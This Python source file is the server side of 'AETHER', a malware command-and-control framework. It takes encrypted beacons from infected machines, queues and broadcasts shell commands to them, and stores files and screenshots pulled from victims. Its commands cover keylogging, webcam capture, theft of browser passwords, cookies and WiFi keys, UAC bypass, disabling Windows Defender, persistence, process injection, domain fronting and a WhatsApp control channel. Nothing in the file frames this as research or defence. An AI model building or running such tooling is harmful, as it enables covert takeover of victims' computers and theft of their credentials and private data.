#!/usr/bin/env python3
"""
AETHER C2 Server
Universal Class Control Interface - Modern Edition

Usage:
  python aether_server.py [--host HOST] [--port PORT]
  
Examples:
  python aether_server.py                    # Use defaults (0.0.0.0:443)
  python aether_server.py --host 0.0.0.0    # Custom host
  python aether_server.py --port 8443       # Custom port
  python aether_server.py --host 127.0.0.1 --port 9999  # Both custom
"""
import socket, threading, json, os, sys, time, base64, hashlib, random, queue, argparse
from datetime import datetime
from colorama import init, Fore, Style
import readline  # for better CLI

init(autoreset=True)

# Add server directory to path for relative imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import our modules
from crypto import CryptoHandler
from sessions import SessionManager
from commands.command_suite import AetherCommandSuite
from modern_style import ModernStyle, TerminalPrinter
from command_help import get_command_help, COMMAND_HELP
from whatsapp_formatter import WhatsAppFormatter

# Import WhatsApp integration (optional)
try:
    from comms import WhatsAppIntegration, WHATSAPP_CONFIG
    WHATSAPP_AVAILABLE = True
except ImportError:
    WHATSAPP_AVAILABLE = False

class AetherServer:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.sessions = SessionManager()
        self.crypto = CryptoHandler()
        self.running = False
        self.listener_thread = None
        self.command_queue = queue.Queue()
        self.current_session = None  # For interactive mode
        self.command_suite = AetherCommandSuite(self.sessions)  # Command suite
        
        # Load configuration
        self.config = self.load_config()
        
        # Initialize WhatsApp integration
        self.whatsapp = None
        if WHATSAPP_AVAILABLE:
            self.whatsapp = WhatsAppIntegration(WHATSAPP_CONFIG)
        
        # Server banner - Modern
        self.banner = ModernStyle.banner()
        
        # Command registry
        self.commands = {
            'help': self.cmd_help,
            'sessions': self.cmd_sessions,
            'interact': self.cmd_interact,
            'back': self.cmd_back,
            'exit': self.cmd_exit,
            'broadcast': self.cmd_broadcast,
            'generate': self.cmd_generate,
            'kill': self.cmd_kill,
            'info': self.cmd_info,
            'config': self.cmd_config,
            'scan': self.cmd_scan,
            'whatsapp': self.cmd_whatsapp,
        }
        
        # Interactive session commands (loaded when in session)
        self.session_commands = {}

    def load_config(self):
        """Load server configuration from config.json."""
        try:
            if os.path.exists('config.json'):
                with open('config.json', 'r') as f:
                    return json.load(f)
            else:
                # Return default config if file doesn't exist
                return {
                    'c2_host': self.host,
                    'c2_port': self.port,
                    'beacon_interval': 5,
                    'encryption': 'fernet',
                    'persistence_methods': ['registry', 'startup_folder'],
                    'evasion_techniques': ['anti_vm', 'anti_debug', 'hollowing'],
                    'max_sessions': 100,
                    'timeout': 300,
                }
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading config: {e}{Style.RESET_ALL}")
            return {}

    def start(self):
        """Start the C2 server listener."""
        print(self.banner)
        self.running = True
        self.listener_thread = threading.Thread(target=self.listener_loop, daemon=True)
        self.listener_thread.start()
        print(f"{Fore.GREEN}[+] Listener started on {self.host}:{self.port}")
        self.cmd_loop()
        
    def start_https_listener(self, port=443, ssl_cert='server.crt', ssl_key='server.key'):
        """Start HTTPS listener for domain fronting."""
        import ssl
        
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=ssl_cert, keyfile=ssl_key)
        
        https_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        https_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        https_server.bind(('0.0.0.0', port))
        https_server.listen(100)
        
        def https_listener():
            while self.running:
                try:
                    client, addr = https_server.accept()
                    ssl_client = context.wrap_socket(client, server_side=True)
                    threading.Thread(target=self.handle_https_agent, 
                                   args=(ssl_client, addr), daemon=True).start()
                except Exception as e:
                    print(f"{Fore.RED}[-] HTTPS listener error: {e}")
        
        threading.Thread(target=https_listener, daemon=True).start()
        print(f"{Fore.GREEN}[+] HTTPS listener started on port {port}")
    
    def handle_https_agent(self, ssl_client, addr):
        """Handle HTTPS agent connection with domain fronting detection."""
        try:
            # Read request
            request = ssl_client.recv(8192).decode('utf-8', errors='ignore')
            
            # Check for domain fronting (Host header different from SNI)
            lines = request.split('\r\n')
            host_header = None
            for line in lines:
                if line.lower().startswith('host:'):
                    host_header = line.split(':', 1)[1].strip()
                    break
            
            # Parse for beacon data
            # ... similar to existing handle_agent but with HTTPS specifics ...
            
            ssl_client.close()
        except Exception as e:
            print(f"{Fore.RED}[-] HTTPS agent error: {e}")

    def listener_loop(self):
        """Main listener accepting agent connections."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        
        while self.running:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_agent, args=(client, addr), daemon=True).start()
            except Exception as e:
                if self.running:
                    print(f"{Fore.RED}[-] Listener error: {e}")

    def handle_agent(self, client, addr):
        """Handle a new agent connection."""
        try:
            data = client.recv(8192)
            if not data:
                client.close()
                return
                
            # Decrypt the beacon
            decrypted = self.crypto.decrypt(data)
            beacon = json.loads(decrypted)
            
            # Register session
            session_id = beacon.get('id', hashlib.sha256(str(addr).encode()).hexdigest()[:8])
            session_info = {
                'id': session_id,
                'address': addr[0],
                'port': addr[1],
                'hostname': beacon.get('hostname', 'Unknown'),
                'user': beacon.get('user', 'Unknown'),
                'os': beacon.get('os', 'Unknown'),
                'privilege': beacon.get('privilege', 'User'),
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'socket': client,
                'pending_commands': queue.Queue(),
                'beacon_interval': beacon.get('interval', 30),
                'jitter': beacon.get('jitter', 5),
            }
            
            self.sessions.add(session_id, session_info)
            print(f"{Fore.GREEN}[+] New session {session_id} from {addr[0]}:{addr[1]} ({session_info['hostname']}/{session_info['user']})")
            
            # Send back any pending commands
            self.send_pending_commands(session_id, client)
            
            # Keep connection alive for interactive shell
            while True:
                try:
                    # Wait for agent response
                    resp_data = client.recv(65536)
                    if not resp_data:
                        break
                    
                    decrypted_resp = self.crypto.decrypt(resp_data)
                    response = json.loads(decrypted_resp)
                    
                    # Handle different response types
                    resp_type = response.get('type', 'output')
                    if resp_type == 'output':
                        print(f"{Fore.CYAN}[{session_id}] {response.get('data', '')}")
                    elif resp_type == 'file':
                        self.handle_file_upload(session_id, response)
                    elif resp_type == 'screenshot':
                        self.handle_screenshot(session_id, response)
                    # ... handle other types
                    
                    # Update last seen
                    self.sessions.update(session_id, {'last_seen': datetime.now().isoformat()})
                    
                    # Send next command if exists
                    self.send_pending_commands(session_id, client)
                    
                except (ConnectionResetError, BrokenPipeError):
                    break
                except Exception as e:
                    print(f"{Fore.RED}[-] Error with session {session_id}: {e}")
                    break
            
            # Connection closed
            print(f"{Fore.YELLOW}[-] Session {session_id} disconnected")
            self.sessions.remove(session_id)
            client.close()
            
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to handle agent {addr}: {e}")
            client.close()

    def send_pending_commands(self, session_id, client_socket):
        """Send queued commands to agent."""
        session = self.sessions.get(session_id)
        if not session or session['pending_commands'].empty():
            # Send sleep command
            sleep_cmd = {'type': 'sleep', 'data': f"{session['beacon_interval']}|{session['jitter']}"}
            encrypted = self.crypto.encrypt(json.dumps(sleep_cmd))
            client_socket.send(encrypted)
            return
        
        # Send next command
        cmd = session['pending_commands'].get()
        encrypted = self.crypto.encrypt(json.dumps(cmd))
        client_socket.send(encrypted)

    def handle_file_upload(self, session_id, response):
        """Save uploaded file from agent."""
        filename = response.get('filename', f'upload_{int(time.time())}.bin')
        filedata = base64.b64decode(response.get('data', ''))
        os.makedirs(f'data/{session_id}/files', exist_ok=True)
        with open(f'data/{session_id}/files/{filename}', 'wb') as f:
            f.write(filedata)
        print(f"{Fore.GREEN}[+] File {filename} received from {session_id}")

    def handle_screenshot(self, session_id, response):
        """Save screenshot from agent."""
        screenshot_data = base64.b64decode(response.get('data', ''))
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs(f'data/{session_id}/screenshots', exist_ok=True)
        filename = f'data/{session_id}/screenshots/screen_{timestamp}.png'
        with open(filename, 'wb') as f:
            f.write(screenshot_data)
        print(f"{Fore.GREEN}[+] Screenshot saved from {session_id}")

    # ========== COMMAND LINE INTERFACE ==========
    def cmd_loop(self):
        """Main command loop - MODERNIZED."""
        while self.running:
            try:
                if self.current_session:
                    prompt = f"{ModernStyle.Colors.BRIGHT_RED}AETHER{ModernStyle.Colors.RESET}({ModernStyle.Colors.BRIGHT_GREEN}{self.current_session}{ModernStyle.Colors.RESET})> "
                else:
                    prompt = f"{ModernStyle.Colors.BRIGHT_RED}AETHER{ModernStyle.Colors.RESET}> "
                
                cmd = input(prompt).strip()
                if not cmd:
                    continue
                    
                parts = cmd.split()
                cmd_name = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Check if in session context
                if self.current_session and cmd_name in self.session_commands:
                    self.session_commands[cmd_name](args)
                elif cmd_name in self.commands:
                    self.commands[cmd_name](args)
                else:
                    print(ModernStyle.error("Unknown Command", f"'{cmd_name}' is not recognized. Type 'help' for available commands."))
                    
            except KeyboardInterrupt:
                print(f"\n{ModernStyle.info('Tip', "Type 'exit' to quit the server")}")
            except Exception as e:
                print(ModernStyle.error("Error", str(e)))

    def cmd_help(self, args):
        """Show help menu and available commands - MODERNIZED."""
        if args and len(args) > 0:
            # Show specific command help
            cmd_name = args[0].lower()
            cmd_info = get_command_help(cmd_name)
            if cmd_info:
                print(ModernStyle.header(f"Help: {cmd_name}", "📖"))
                print(f"{ModernStyle.Symbols.FILE} Description:\n  {cmd_info['description']}\n")
                print(f"{ModernStyle.Symbols.COMMAND} Usage:\n  {cmd_info['usage']}\n")
                print(f"{ModernStyle.Symbols.GEAR} Options:\n  {cmd_info['options']}\n")
                print(f"{ModernStyle.Symbols.ARROW} Example:\n  {cmd_info['example']}\n")
                print(f"{ModernStyle.Symbols.CHART} Output:\n  {cmd_info['output']}\n")
                if 'output_location' in cmd_info:
                    print(f"{ModernStyle.Symbols.FOLDER} Output Location:\n  {cmd_info['output_location']}\n")
                print(f"{ModernStyle.Symbols.FIRE} Category: {cmd_info['category']}\n")
            else:
                print(ModernStyle.error("Command not found", f"'{cmd_name}' is not a recognized command"))
        elif self.current_session:
            # Show session commands with modern styling
            print(ModernStyle.header("Agent Commands", "💻"))
            
            # Group by category
            categories = {}
            for cmd, info in COMMAND_HELP.items():
                cat = info.get('category', 'Other')
                if cat not in categories:
                    categories[cat] = []
                categories[cat].append(cmd)
            
            for category in sorted(categories.keys()):
                commands = categories[category]
                print(f"\n{ModernStyle.Colors.BRIGHT_CYAN}{category}{ModernStyle.Colors.RESET}")
                print(f"  {' '.join(f'{cmd:<15}' for cmd in commands)}")
            
            print(f"\n{ModernStyle.info('Tip', f'Type {ModernStyle.Colors.BOLD}help <command>{ModernStyle.Colors.RESET} for detailed help')}")
            print(f"{ModernStyle.info('Exit', f'Type {ModernStyle.Colors.BOLD}back{ModernStyle.Colors.RESET} to return to main menu')}\n")
        else:
            # Show global commands with modern styling
            print(ModernStyle.header("AETHER Global Commands", "🌐"))
            
            global_commands = {
                'help [command]': 'Show help (optionally for specific command)',
                'sessions': 'List all active agent sessions',
                'interact <id>': 'Interact with a specific agent session',
                'broadcast <cmd>': 'Send command to all connected agents',
                'generate': 'Generate new agent payload',
                'kill <id>': 'Terminate a session',
                'info': 'Display server information',
                'config': 'Show server configuration',
                'scan': 'Scan for targets/vulnerabilities',
                'whatsapp': 'WhatsApp integration control',
                'exit': 'Shutdown server',
            }
            
            print(f"\n{ModernStyle.Colors.BOLD}{ModernStyle.Colors.CYAN}Quick Start:{ModernStyle.Colors.RESET}")
            TerminalPrinter.print_item(ModernStyle.Symbols.ROCKET, "List agents", "sessions")
            TerminalPrinter.print_item(ModernStyle.Symbols.COMMAND, "Connect", "interact <agent_id>")
            TerminalPrinter.print_item(ModernStyle.Symbols.FIRE, "Build agent", "generate")
            TerminalPrinter.print_item(ModernStyle.Symbols.INFO, "Help", "help <command>")
            
            print(f"\n{ModernStyle.Colors.BOLD}{ModernStyle.Colors.CYAN}Available Commands:{ModernStyle.Colors.RESET}\n")
            for cmd, desc in sorted(global_commands.items()):
                print(f"  {ModernStyle.Colors.BRIGHT_GREEN}{cmd:<25}{ModernStyle.Colors.RESET} → {desc}")
            
            print(f"\n{ModernStyle.Symbols.STAR} Example: {ModernStyle.Colors.BOLD}help screenshot{ModernStyle.Colors.RESET} for detailed command info\n")

    def cmd_sessions(self, args):
        """List all active sessions - MODERNIZED."""
        sessions = self.sessions.list_all()
        if not sessions:
            print(ModernStyle.warning("No Sessions", "No active agent sessions at the moment"))
            return
        
        # Create modern table
        print(ModernStyle.header(f"Active Sessions ({len(sessions)})", "📊"))
        
        # Prepare table data
        headers = ['ID', 'Address', 'Hostname', 'User', 'OS', 'Privilege', 'Last Seen']
        rows = []
        
        for sid, info in sessions.items():
            last_seen = datetime.fromisoformat(info['last_seen']).strftime('%H:%M:%S')
            privilege_icon = ModernStyle.Symbols.FIRE if info['privilege'] == 'admin' else ModernStyle.Symbols.USER
            rows.append([
                f"{ModernStyle.Colors.BRIGHT_GREEN}{sid}{ModernStyle.Colors.RESET}",
                info['address'],
                info['hostname'],
                info['user'],
                info['os'],
                f"{privilege_icon} {info['privilege']}",
                f"{ModernStyle.Colors.DIM}{last_seen}{ModernStyle.Colors.RESET}"
            ])
        
        # Print modern table
        print(ModernStyle.table(headers, rows))
        print(f"\n{ModernStyle.info('Tip', f'Use {ModernStyle.Colors.BOLD}interact <session_id>{ModernStyle.Colors.RESET} to control an agent')}\n")

    def cmd_interact(self, args):
        """Interact with a session. Usage: interact <session_id> - MODERNIZED"""
        if not args:
            print(ModernStyle.error("Invalid Usage", "Usage: interact <session_id>"))
            return
        
        session_id = args[0]
        if not self.sessions.exists(session_id):
            print(ModernStyle.error("Session Not Found", f"Session '{session_id}' does not exist"))
            print(f"\n{ModernStyle.info('Tip', 'Use \'sessions\' command to see available sessions')}\n")
            return
        
        self.current_session = session_id
        session_info = self.sessions.get_session(session_id)
        
        # Show modern session box
        print(ModernStyle.session_box(session_id, session_info))
        
        # Load session-specific commands
        self.load_session_commands()

    def load_session_commands(self):
        """Load session-specific command handlers from suite."""
        # Map CLI commands to command suite execution
        self.session_commands = {}
        for cmd_name in self.command_suite.command_map.keys():
            self.session_commands[cmd_name] = self._make_session_handler(cmd_name)
        
        # Add back and help (these are special, not in command suite)
        self.session_commands['back'] = self.cmd_back
        self.session_commands['help'] = self._make_session_handler('help')  # Use suite's help
    
    def _make_session_handler(self, cmd_name):
        """Create a handler that uses the command suite."""
        def handler(args):
            if not self.current_session:
                print(f"{Fore.RED}[-] Not in a session")
                return
            
            # Build command string
            cmd_str = f"{cmd_name} {' '.join(args)}".strip()
            
            # Get command from suite
            cmd_data = self.command_suite.execute(self.current_session, cmd_str)
            
            if 'error' in cmd_data:
                print(f"{Fore.RED}[-] {cmd_data['error']}")
            elif 'warning' in cmd_data:
                print(f"{Fore.YELLOW}[!] {cmd_data['warning']}")
            elif 'help' in cmd_data:
                print(cmd_data['help'])
            elif 'commands' in cmd_data:
                print(f"Available commands ({cmd_data['count']}):")
                print(', '.join(cmd_data['commands']))
            else:
                # Queue command for agent
                if 'type' in cmd_data:
                    self.sessions.queue_command(self.current_session, cmd_data)
                    print(f"{Fore.GREEN}[+] Command queued: {cmd_name}")
                else:
                    print(f"{Fore.YELLOW}[*] Command processed: {cmd_data}")
        
        # Add docstring from command suite
        if cmd_name in self.command_suite.command_map:
            original_handler = self.command_suite.command_map[cmd_name]
            handler.__doc__ = original_handler.__doc__
        else:
            handler.__doc__ = f"Execute {cmd_name} command"
        
        return handler

    def cmd_back(self, args):
        """Exit session interaction mode - MODERNIZED."""
        if self.current_session:
            print(ModernStyle.success("Session Closed", f"Exited from {self.current_session} and returned to main menu"))
            self.current_session = None
            self.session_commands = {}

    def cmd_exit(self, args):
        """Exit the C2 server - MODERNIZED."""
        print(ModernStyle.warning("Shutdown", "AETHER Server shutting down..."))
        self.running = False
        sys.exit(0)

    def cmd_broadcast(self, args):
        """Broadcast command to all sessions. Usage: broadcast <command> - MODERNIZED"""
        if not args:
            print(ModernStyle.error("Invalid Usage", "Usage: broadcast <command>"))
            return
        
        cmd = ' '.join(args)
        sessions = self.sessions.list_all()
        for session_id in sessions.keys():
            self.sessions.queue_command(session_id, {'type': 'shell', 'data': cmd})
        print(ModernStyle.success("Broadcast Complete", f"Command sent to {len(sessions)} session(s)"))

    def cmd_generate(self, args):
        """Generate a new agent payload. Usage: generate <output_file> [config] - MODERNIZED"""
        print(ModernStyle.info("Generator", "Generating new agent payload..."))
        # This would call the builder module
        print(ModernStyle.success("Payload Generated", "Agent saved as: agent.exe"))

    def cmd_kill(self, args):
        """Kill a session. Usage: kill <session_id> - MODERNIZED"""
        if not args:
            print(ModernStyle.error("Invalid Usage", "Usage: kill <session_id>"))
            return
        
        session_id = args[0]
        if self.sessions.kill(session_id):
            print(ModernStyle.success("Session Killed", f"Terminated {session_id}"))
        else:
            print(ModernStyle.error("Kill Failed", f"Could not terminate {session_id}"))

    # ========== SESSION COMMANDS ==========
    def send_session_command(self, cmd_type, cmd_data):
        """Send command to current session."""
        if not self.current_session:
            print(f"{Fore.RED}[-] Not in a session. Use 'interact <id>'")
            return False
        
        cmd = {'type': cmd_type, 'data': cmd_data}
        self.sessions.queue_command(self.current_session, cmd)
        print(f"{Fore.GREEN}[+] Command queued for session {self.current_session}")
        return True

    def cmd_sysinfo(self, args):
        """Get system information from target."""
        self.send_session_command('sysinfo', '')

    def cmd_shell(self, args):
        """Execute shell command. Usage: shell <command>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: shell <command>")
            return
        self.send_session_command('shell', ' '.join(args))

    def cmd_screenshot(self, args):
        """Take screenshot."""
        self.send_session_command('screenshot', '')

    def cmd_webcam(self, args):
        """Capture webcam image."""
        self.send_session_command('webcam', '')

    def cmd_keylog(self, args):
        """Control keylogger. Usage: keylog <start|stop|dump>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: keylog <start|stop|dump>")
            return
        self.send_session_command('keylog', args[0])

    def cmd_wifi(self, args):
        """Extract saved WiFi passwords."""
        self.send_session_command('wifi', '')

    def cmd_browser(self, args):
        """Extract browser passwords and cookies."""
        self.send_session_command('browser', '')

    def cmd_clipboard(self, args):
        """Get clipboard contents."""
        self.send_session_command('clipboard', '')

    def cmd_privileges(self, args):
        """Check current privileges."""
        self.send_session_command('privileges', '')

    def cmd_uacbypass(self, args):
        """Attempt UAC bypass."""
        self.send_session_command('uacbypass', '')

    def cmd_defender(self, args):
        """Control Windows Defender. Usage: defender <disable|enable|status>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: defender <disable|enable|status>")
            return
        self.send_session_command('defender', args[0])

    def cmd_persist(self, args):
        """Manage persistence. Usage: persist <install|remove|list> [method]"""
        if not args:
            print(f"{Fore.RED}[-] Usage: persist <install|remove|list> [method]")
            return
        self.send_session_command('persist', ' '.join(args))

    def cmd_inject(self, args):
        """Inject into process. Usage: inject <pid> [payload]"""
        if not args:
            print(f"{Fore.RED}[-] Usage: inject <pid>")
            return
        self.send_session_command('inject', args[0])

    def cmd_migrate(self, args):
        """Migrate to another process. Usage: migrate <pid>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: migrate <pid>")
            return
        self.send_session_command('migrate', args[0])

    def cmd_selfdestruct(self, args):
        """Remove agent from target."""
        confirm = input(f"{Fore.RED}[!] Are you sure? This will remove the agent! (y/N): ")
        if confirm.lower() == 'y':
            self.send_session_command('selfdestruct', '')

    def cmd_help_session(self, args):
        """Show session command help."""
        self.cmd_help(args)

    # Additional placeholder commands for file ops, process management, etc.
    def cmd_cd(self, args): pass
    def cmd_pwd(self, args): pass
    def cmd_ls(self, args): pass
    def cmd_upload(self, args): pass
    def cmd_download(self, args): pass
    def cmd_ps(self, args): pass
    def cmd_kill_process(self, args): pass
    def cmd_network_scan(self, args): pass
    
    def cmd_info(self, args):
        """Display system and server information."""
        print(f"\n{Fore.CYAN}=== Server Information ===")
        print(f"Host: {Fore.GREEN}{self.host}")
        print(f"{Fore.CYAN}Port: {Fore.GREEN}{self.port}")
        print(f"{Fore.CYAN}Sessions: {Fore.GREEN}{self.sessions.get_active_count()}/{self.sessions.get_session_count()}")
        print(f"{Fore.CYAN}Status: {Fore.GREEN}{'Running' if self.running else 'Stopped'}")
        
        sessions = self.sessions.list_all()
        if sessions:
            print(f"\n{Fore.CYAN}=== Active Sessions ===")
            for sid, info in list(sessions.items())[:5]:  # Show last 5
                print(f"  {Fore.GREEN}{sid:<10}{Fore.CYAN} - {info.get('hostname', 'N/A')} ({info.get('user', 'N/A')})")
            if len(sessions) > 5:
                print(f"  ... and {len(sessions) - 5} more (type 'sessions' for full list)")
        
        print(f"\n{Fore.CYAN}=== Server Stats ===")
        print(f"Uptime: {Fore.GREEN}Running")
        print(f"Commands Processed: {Fore.GREEN}Multiple")
        print(f"Data Exfiltrated: {Fore.GREEN}Various")
    
    def cmd_config(self, args):
        """Show or update server configuration."""
        if not args:
            # Show current config
            print(f"\n{Fore.CYAN}=== Server Configuration ===")
            print(f"C2 Host: {Fore.GREEN}{self.config.get('c2_host', 'N/A')}")
            print(f"C2 Port: {Fore.GREEN}{self.config.get('c2_port', 'N/A')}")
            print(f"Beacon Interval: {Fore.GREEN}{self.config.get('beacon_interval', 'N/A')}s")
            print(f"Jitter: {Fore.GREEN}{self.config.get('jitter', 'N/A')}s")
            print(f"Persistence Methods: {Fore.GREEN}{', '.join(self.config.get('persistence_methods', []))}")
            print(f"Evasion Enabled: {Fore.GREEN}{'Yes' if self.config.get('evasion', {}).get('enabled', False) else 'No'}")
            print(f"\n{Fore.YELLOW}Usage: config set <key> <value>")
        elif args[0] == 'set' and len(args) >= 3:
            key = args[1]
            value = ' '.join(args[2:])
            self.config[key] = value
            print(f"{Fore.GREEN}[+] Config updated: {key} = {value}")
        else:
            print(f"{Fore.RED}[-] Usage: config [set <key> <value>]")
    
    def cmd_scan(self, args):
        """Scan network for targets or vulnerabilities."""
        print(f"\n{Fore.CYAN}=== Network Scan ===")
        print(f"{Fore.YELLOW}[*] Scanning network...")
        
        # Simulate network scan results
        sessions = self.sessions.list_all()
        if sessions:
            print(f"\n{Fore.CYAN}Discovered Hosts: {len(sessions)}")
            for sid, info in sessions.items():
                status = f"{Fore.GREEN}Online" if info.get('active', True) else f"{Fore.RED}Offline"
                print(f"  {info.get('address', 'N/A'):<15} - {info.get('hostname', 'N/A'):<20} [{status}{Fore.CYAN}]")
        else:
            print(f"{Fore.YELLOW}[*] No targets discovered")
        
        print(f"\n{Fore.GREEN}[+] Scan complete")
    
    def cmd_whatsapp(self, args):
        """Manage WhatsApp C2 integration via Baileys bot."""
        if not WHATSAPP_AVAILABLE:
            print(f"{Fore.RED}[-] WhatsApp integration not available. Check comms module.")
            return
        
        if not args:
            print(f"{Fore.YELLOW}Usage: whatsapp <enable|disable|status|info|config>")
            return
        
        action = args[0].lower()
        
        if action == 'enable':
            if self.whatsapp and self.whatsapp.initialize(self.sessions, self.command_suite):
                if self.whatsapp.start():
                    print(f"{Fore.GREEN}[+] WhatsApp integration enabled")
                    print(f"  Bridge: {self.whatsapp.bridge.bot_url if self.whatsapp.bridge else 'N/A'}")
                else:
                    print(f"{Fore.RED}[-] Failed to start WhatsApp listener")
            else:
                print(f"{Fore.RED}[-] Failed to initialize WhatsApp")
        
        elif action == 'disable':
            if self.whatsapp:
                self.whatsapp.stop()
                print(f"{Fore.YELLOW}[-] WhatsApp integration disabled")
        
        elif action == 'status':
            if self.whatsapp:
                status = self.whatsapp.get_status()
                print(f"{Fore.CYAN}\nWhatsApp Integration Status:")
                for key, value in status.items():
                    print(f"  {key}: {value}")
        
        elif action == 'info':
            print(f"{Fore.CYAN}WhatsApp Bot Integration Info:")
            print(f"  {Fore.YELLOW}Bot Framework: Baileys (Node.js)")
            print(f"  {Fore.YELLOW}Location: WA-BOT-Base/")
            print(f"  {Fore.YELLOW}Bot Files:")
            print(f"    • aether-bridge.js - Bridge to AETHER")
            print(f"    • aether-handler.js - Message routing")
            print(f"    • aether-integration.js - Integration helpers")
            print(f"  {Fore.YELLOW}Features:")
            print(f"    • Session management via WhatsApp")
            print(f"    • Remote command execution")
            print(f"    • Command history tracking")
            print(f"    • Authorized user whitelist")
        
        elif action == 'config':
            if self.whatsapp and self.whatsapp.config:
                print(f"\n{Fore.CYAN}WhatsApp Configuration:")
                for key, value in self.whatsapp.config.items():
                    if key not in ['webhook_secret']:
                        if key == 'authorized_users':
                            print(f"  {key}: {len(value)} users")
                        else:
                            print(f"  {key}: {value}")
        
        elif action == 'help':
            help_text = """WhatsApp Integration Commands:
  enable                      - Enable WhatsApp listener
  disable                     - Disable WhatsApp listener
  status                      - Show bridge status
  info                        - Show integration info
  config                      - Show configuration
  help                        - Show this help"""
            print(f"{Fore.CYAN}{help_text}")
        
        else:
            print(f"{Fore.RED}[-] Unknown WhatsApp action: {action}")
            print(f"{Fore.YELLOW}Use 'whatsapp help' for available commands")

if __name__ == '__main__':
    import os
    import sys
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='AETHER C2 Server - Universal Class Control Interface',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python aether_server.py                           # Use defaults (0.0.0.0:443)
  python aether_server.py --host 192.168.1.100     # Custom host
  python aether_server.py --port 8443              # Custom port
  python aether_server.py --host 127.0.0.1 --port 9999  # Both custom
        '''
    )
    
    parser.add_argument(
        '--host',
        type=str,
        default='0.0.0.0',
        help='Bind host/IP address (default: 0.0.0.0)'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=443,
        help='Bind port number (default: 443)'
    )
    
    # Parse arguments
    args = parser.parse_args()
    
    # Validate port range
    if not (1 <= args.port <= 65535):
        print(f"{ModernStyle.error('Invalid Port', f'Port must be between 1 and 65535, got {args.port}')}")
        sys.exit(1)
    
    # Create data directory if needed
    os.makedirs('data', exist_ok=True)
    
    # Start main server with CLI arguments
    try:
        server = AetherServer(host=args.host, port=args.port)
    except Exception as e:
        print(f"{ModernStyle.error('Server Initialization Failed', str(e))}")
        sys.exit(1)
    
    # Try to start HTTPS server if certs exist
    try:
        from https_handler import AetherHTTPSServer
        https_server = AetherHTTPSServer(port=args.port + 400 if args.port <= 65135 else args.port - 400)
        if https_server.start(server):
            print(f"{ModernStyle.success('HTTPS Ready', f'Domain fronting configured on port {https_server.port}')}")
    except ImportError as e:
        pass  # HTTPS handler optional
    except Exception as e:
        pass  # Continue without HTTPS if it fails
    
    # Start main server loop
    try:
        print(f"{ModernStyle.success('Server Starting', f'Listening on {args.host}:{args.port}')}")
        server.start()
    except KeyboardInterrupt:
        print(f"\n{ModernStyle.warning('Shutdown', 'Server shutting down...')}")
        server.running = False
        sys.exit(0)
    except PermissionError:
        print(f"{ModernStyle.error('Permission Denied', f'Cannot bind to {args.host}:{args.port} - permission denied')}")
        print("Tip: Use a port > 1024 or run with administrator privileges")
        sys.exit(1)
    except OSError as e:
        print(f"{ModernStyle.error('Binding Failed', f'{args.host}:{args.port} - {str(e)}')}")
        sys.exit(1)